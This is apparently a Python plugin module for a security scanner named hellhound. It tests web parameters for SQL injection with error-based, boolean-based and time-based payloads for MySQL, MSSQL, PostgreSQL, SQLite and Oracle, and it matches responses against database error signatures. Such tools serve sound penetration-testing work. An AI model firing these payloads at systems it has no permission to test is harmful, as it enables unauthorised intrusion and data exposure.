import asyncio
import aiohttp
import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from hellhound.core import http_utils, ai_utils

NAME = "sqli_tester"
CATEGORY = "vuln"
DESCRIPTION = "Targeted SQL Injection Auditor (Error, Boolean, Time-based, Multi-DB)"

OPTIONS = [
    {"name": "concurrency", "type": int, "default": 10, "help": "Concurrent attack threads"},
    {"name": "timeout", "type": int, "default": 15, "help": "Request timeout (seconds)"},
    {"name": "time_delay", "type": int, "default": 5, "help": "Seconds for time-based sleep probes"},
    {"name": "enable_time_based", "type": bool, "default": True, "help": "Enable time-based (SLEEP) probes"},
    {"name": "ai_analysis", "type": bool, "default": True, "help": "Use AI for ambiguous boolean logic flip analysis"},
]

# ─────────────────────────────────────────────────────────────────────────────
# SIGNATURES & PAYLOADS (Multi-DB)
# ─────────────────────────────────────────────────────────────────────────────

ERROR_SIGNATURES = [
    # MySQL
    (r"SQL syntax.*MySQL", "MySQL"),
    (r"mysql_fetch", "MySQL"),
    (r"MySqlException", "MySQL"),
    # PostgreSQL
    (r"PostgreSQL query failed", "PostgreSQL"),
    (r"pg_query\(\)", "PostgreSQL"),
    (r"unterminated quoted string", "PostgreSQL"),
    # MSSQL
    (r"Microsoft OLE DB Provider", "MSSQL"),
    (r"Unclosed quotation mark", "MSSQL"),
    (r"System\.Data\.SqlClient", "MSSQL"),
    (r"\[Microsoft\]\[ODBC", "MSSQL"),
    # Oracle
    (r"ORA-[0-9]{5}", "Oracle"),
    (r"quoted string not properly terminated", "Oracle"),
    # SQLite
    (r"SQLite/JDBCDriver", "SQLite"),
    (r"SQLITE_ERROR", "SQLite"),
    (r"sqlite3\.OperationalError", "SQLite"),
    # Generic
    (r"You have an error in your SQL syntax", "Generic"),
    (r"Warning.*mysql_.*", "Generic"),
    (r"valid MySQL result", "Generic"),
]

BOOLEAN_PROBES = [
    ("' AND 1=1--", "' AND 1=2--"),
    ("\" AND 1=1--", "\" AND 1=2--"),
    (" AND 1=1", " AND 1=2"),
    ("' OR '1'='1", "' OR '1'='2"),
    (") AND (1=1", ") AND (1=2"),
]

TIME_PROBES = [
    # MySQL
    ("'; SELECT SLEEP({delay})--", "MySQL"),
    ("' OR SLEEP({delay})--", "MySQL"),
    ("\" OR SLEEP({delay})--", "MySQL"),
    # MSSQL
    ("'; WAITFOR DELAY '0:0:{delay}'--", "MSSQL"),
    # PostgreSQL
    ("'; SELECT pg_sleep({delay})--", "PostgreSQL"),
    # SQLite
    ("' AND 1=randomblob({delay}00000000)--", "SQLite"),
    # Oracle
    ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--", "Oracle"),
]

ERROR_PAYLOADS = [
    "'",
    "\"",
    "' OR 1=1--",
    "1' ORDER BY 100--",
    "1 UNION SELECT NULL--",
    "') OR ('1'='1",
]

# ─────────────────────────────────────────────────────────────────────────────
# AUDITOR ENGINE
# ─────────────────────────────────────────────────────────────────────────────

class SQLIAuditor:
    def __init__(self, emit, session, options):
        self.emit = emit
        self.session = session
        self.options = options
        self.findings = []
        self.semaphore = asyncio.Semaphore(options.get("concurrency", 10))

    async def check_error_based(self, url, method, pname, original_value):
        """Checks for database error messages with multi-DB signatures."""
        for payload_suffix in ERROR_PAYLOADS:
            payload = original_value + payload_suffix
            try:
                async with self.semaphore:
                    async with self.session.request(method, url, params={pname: payload}, timeout=self.options.get("timeout")) as r:
                        body = await r.text()
                        for sig, db_type in ERROR_SIGNATURES:
                            if re.search(sig, body, re.I):
                                return {
                                    "type": "ERROR_BASED",
                                    "db_type": db_type,
                                    "evidence": f"SQL error triggered ({db_type}): matched '{sig}'",
                                    "payload": payload
                                }
            except:
                pass
        return None

    async def check_boolean_based(self, url, method, pname, original_value):
        """Checks for logical differences in response length/status with AI verification."""
        for true_p, false_p in BOOLEAN_PROBES:
            try:
                async with self.semaphore:
                    # True request
                    async with self.session.request(method, url, params={pname: original_value + true_p}) as r1:
                        t_body = await r1.text()
                        t_len = len(t_body)
                        t_status = r1.status
                    
                    # False request
                    async with self.session.request(method, url, params={pname: original_value + false_p}) as r2:
                        f_body = await r2.text()
                        f_len = len(f_body)
                        f_status = r2.status
                    
                    len_diff = abs(t_len - f_len)
                    
                    # Clear logic flip
                    if t_status == f_status and len_diff > 50:
                        return {
                            "type": "BOOLEAN_BASED",
                            "evidence": f"Logic flip detected (Length T:{t_len} vs F:{f_len}, Δ{len_diff})",
                            "payload": true_p
                        }
                    
                    # Ambiguous case — flag for user-triggered AI analysis later
                    if t_status == f_status and 10 < len_diff <= 50:
                        return {
                            "type": "BOOLEAN_BASED",
                            "evidence": f"Possible logic flip detected (Length T:{t_len} vs F:{f_len}, Δ{len_diff}) — use 'analyze' for AI verification",
                            "payload": true_p,
                            "needs_ai_verification": True
                        }
            except:
                continue
        return None

    async def check_time_based(self, url, method, pname, original_value):
        """Checks for execution delays using a baseline heuristic with verification."""
        if not self.options.get("enable_time_based"):
            return None

        delay = self.options.get("time_delay", 5)
        
        # Phase 1: Establish Baseline
        try:
            t0 = time.time()
            async with self.semaphore:
                async with self.session.request(method, url, timeout=10) as r:
                    await r.read()
                    baseline = time.time() - t0
        except:
            baseline = 0.5
            
        for payload_tmpl, db_type in TIME_PROBES:
            payload = payload_tmpl.format(delay=delay)
            try:
                t0 = time.time()
                async with self.semaphore:
                    async with self.session.request(method, url, params={pname: payload}, timeout=delay + 10) as r:
                        await r.read()
                        elapsed = time.time() - t0
                        
                        if elapsed >= (baseline + delay - 0.5):
                            # Verification: Confirm linearity with different delay
                            new_delay = delay + 2
                            new_payload = payload_tmpl.format(delay=new_delay)
                            t0_v = time.time()
                            async with self.session.request(method, url, params={pname: new_payload}, timeout=new_delay + 10) as r_v:
                                await r_v.read()
                                elapsed_v = time.time() - t0_v
                                
                                if elapsed_v >= (baseline + new_delay - 0.5):
                                    return {
                                        "type": "TIME_BASED",
                                        "db_type": db_type,
                                        "evidence": f"Confirmed time-delay on {db_type} (Base: {baseline:.2f}s, P1: {elapsed:.2f}s/{delay}s, P2: {elapsed_v:.2f}s/{new_delay}s)",
                                        "payload": payload
                                    }
            except:
                continue
        return None

async def run(target, emit, options=None):
    emit.info(f"[*] SQLI_TESTER: Multi-DB injection audit for {target}")
    
    spider_intel = options.get("spider_intel", {}) if options else {}
    endpoints = spider_intel.get("endpoints", [])
    
    # Priority: params flagged by Hydra as SQLI_POTENTIAL
    hydra_intel = options.get("hydra_intel", {}) if options else {}
    surfaces = hydra_intel.get("surfaces", [])
    
    targets = []
    if surfaces:
        targets = [s for s in surfaces if s.get("recommended_auditor") == "sqli_tester" or "SQLI_POTENTIAL" in s.get("roles", [])]
    
    if not targets and endpoints:
        emit.info("    [i] No Hydra hints found. Auditing all Spider endpoints with dynamic parameters.")
        for ep in endpoints:
            params = ep.get("params", {})
            # Self-healing parameter iteration (handles legacy list and new dict formats)
            all_params = []
            if isinstance(params, dict):
                for bucket in params.values():
                    if isinstance(bucket, list): all_params.extend(bucket)
            elif isinstance(params, list):
                all_params = params

            for p in all_params:
                targets.append({"url": ep.get("url"), "method": ep.get("method", "GET"), "parameter": p})

    if not targets:
        emit.warn("[!] No injection surfaces identified for SQLi testing.")
        return {"raw": "No targets", "signals": []}

    emit.info(f"    [i] Targeted audit on {len(targets)} surface(s)...")
    emit.progress_update(0, label="SQL-INJECTION")

    findings = []
    async with aiohttp.ClientSession() as session:
        auditor = SQLIAuditor(emit, session, options or {})
        
        for i, t in enumerate(targets):
            url = t.get("url")
            method = t.get("method", "GET")
            pname = t.get("parameter")
            
            emit.progress_update(i + 1)
            emit.info(f"    [*] Auditing {pname} on {url}...")
            
            # Error-based
            res = await auditor.check_error_based(url, method, pname, "")
            if res:
                findings.append({**t, **res, "severity": "CRITICAL", "confidence": "CONFIRMED"})
                emit.warn(f"        [!] FOUND {res['type']} ({res.get('db_type', 'Unknown')}): {res['evidence']}")
                continue

            # Boolean-based
            res = await auditor.check_boolean_based(url, method, pname, "")
            if res:
                confidence = "AI_VERIFIED" if res.get("ai_verified") else "STEALTH"
                findings.append({**t, **res, "severity": "HIGH", "confidence": confidence})
                emit.warn(f"        [!] FOUND {res['type']}: {res['evidence']}")
                continue

            # Time-based
            res = await auditor.check_time_based(url, method, pname, "")
            if res:
                findings.append({**t, **res, "severity": "HIGH", "confidence": "STEALTH"})
                emit.warn(f"        [!] FOUND {res['type']} ({res.get('db_type', 'Unknown')}): {res['evidence']}")

    if findings:
        emit.success(f"[+] SQLI_TESTER complete. Found {len(findings)} vulnerabilities!")
    else:
        emit.info("[-] No SQL injection found on identified surfaces.")

    return {
        "raw": f"Audited {len(targets)} surfaces. Found {len(findings)} SQLi.",
        "intel": {
            "vulnerabilities": findings
        },
        "signals": ["SQLI_FOUND" if findings else "NO_SQLI"]
    }
